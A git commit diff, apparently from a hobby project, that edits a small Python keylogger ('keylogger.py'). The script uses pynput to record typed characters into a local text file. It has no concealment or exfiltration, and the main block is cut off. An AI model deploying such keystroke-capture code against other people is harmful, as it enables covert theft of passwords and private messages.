fad2a6d412e0dcb1e5abed9b7df51e8c27229c2d
bilel233 <bilel.mjdb@gmail.com>
2024-08-07 15:25:05 +0100

    distinction entre key.char et keyword.key

--- keylogger.py
+++ keylogger.py
@@ -1,17 +1,16 @@
 from pynput import keyboard
 
+
 def onPush(key):
     """
     enregistre dans un fichier texte les touches frappes
     """
 
     try:
-        with open("keylogger.txt","a") as f:
-            f.write(f"{key.char}")
-    except AttributeError:
-        if key == keyboard.Key.space:
-            with open("keylogger.txt","a") as f:
-                f.write(" ")
+        with open("keylogger.txt", "a") as f:
+            f.write(f"{key.char}")  # on gere les touches alphanumeriques
+    except AttributeError as e:
+        print(f"{e}")
 
 
 if __name__ == "__main__":
